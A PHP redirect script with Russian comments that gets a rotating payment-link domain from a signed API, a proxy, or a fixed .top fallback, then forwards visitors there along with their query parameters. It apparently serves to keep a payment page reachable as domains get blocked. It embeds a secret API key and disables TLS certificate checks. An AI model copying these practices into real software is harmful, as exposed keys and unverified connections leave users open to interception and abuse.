<?php

$current_domain = 'https://1867uu.top/';

/*
 * Основная функция получения домена через API
 */
function getDomainFromAPI() {
    $apiUrl  = 'https://urllink.click/apiRequest/domains/';
    $apiKey  = '7a95e6e83218ce07b895c9bed5089b5c39cf0b7ba1ee4e81e572752db6a629e4';
    $payload = ['t' => 'p', 'pid' => 295];

    $ts = time();
    $nonce = bin2hex(random_bytes(8));
    $has_payload = ($payload !== null);

    if ($has_payload) {
        $canonical_payload = json_encode(
            $payload,
            JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES
        );
    } else {
        $canonical_payload = '';
    }

    $payload_hash = hash('sha256', $canonical_payload);
    $sig_data = $apiKey . $ts . $nonce . $payload_hash;
    $signature = hash('sha256', $sig_data);

    $bodyArr = [
        'api_key'   => $apiKey,
        'ts'        => $ts,
        'nonce'     => $nonce,
        'signature' => $signature,
    ];

    if ($has_payload) {
        $bodyArr['payload'] = $payload;
    }

    $body = json_encode($bodyArr, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

    $ch = curl_init($apiUrl);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => $body,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
    ]);

    $response = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);

    if ($err || $code !== 200) {
        throw new Exception("API request failed: " . $err);
    }

    $domains = json_decode($response, true);

    if (!isset($domains['redirect_url'])) {
        throw new Exception("No redirect url in API response");
    }

    return $domains['redirect_url'];
}

/*
 * Резервная функция получения домена через прокси
 */
function getDomainFromProxy() {
    $proxyUrl = 'https://grustvill.top/proxy-domains.php'; // Замените на ваш прокси URL

    $ch = curl_init($proxyUrl);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_FOLLOWLOCATION => true,
    ]);

    $response = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);

    if ($err || $code !== 200) {
        throw new Exception("Proxy request failed: " . $err);
    }

    $data = json_decode($response, true);

    if (!isset($data['domain'])) {
        throw new Exception("No domain in proxy response");
    }

    $redirect_url = fallbackUrl($data['domain']);;
    return $redirect_url;
}

/**
 * Основная логика выбора домена
 */
function getDomain() {
    global $current_domain;

    // Пытаемся получить домен через API
    try {
        $pay_url = getDomainFromAPI();
        error_log("Url obtained from API: " . $pay_url);
        return $pay_url;
    } catch (Exception $e) {
        error_log("API failed: " . $e->getMessage());
    }

    // Если API не сработал, пробуем через прокси
    try {
        $pay_url = getDomainFromProxy();
        error_log("Url obtained from proxy: " . $pay_url);
        return $pay_url;
    } catch (Exception $e) {
        error_log("Proxy failed: " . $e->getMessage());
    }

    // Если всё провалилось, используем запасной домен
    $pay_url = fallbackUrl($current_domain);
    error_log("Using fallback url: " . $pay_url);
    return $pay_url;
}

function fallbackUrl($domain) {
    return $domain . 'public/9413103836295821';
}

// Основная логика скрипта
try {
    $pay_link = getDomain();
    if (!empty($_GET)) {
        $pay_link .= '?' . http_build_query($_GET);
    }
    header('Location: ' . $pay_link);
    exit();
} catch (Exception $e) {
    // Критическая ошибка - используем запасной домен
    $pay_link = fallbackUrl($current_domain);
    if (!empty($_GET)) {
        $pay_link .= '?' . http_build_query($_GET);
    }
    error_log("Critical error: " . $e->getMessage());
    header('Location: ' . $pay_link);
    exit();
}